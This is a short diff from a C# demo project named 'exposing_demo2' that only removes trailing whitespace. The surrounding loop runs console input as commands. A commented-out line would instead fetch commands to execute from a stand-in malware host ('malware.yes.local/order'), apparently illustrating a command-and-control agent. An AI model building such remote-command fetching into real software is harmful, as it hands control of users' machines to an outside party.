@@ -22,7 +22,7 @@ namespace exposing_demo2
                 //Console.WriteLine(run(new string[] { GetCommand("https://www.malware.yes.local/order") }));
                 Console.Write("> ");
                 Console.WriteLine(run(new string[] { Console.ReadLine() }));
-                
+
                 System.Threading.Thread.Sleep(dwell);
             }
         }
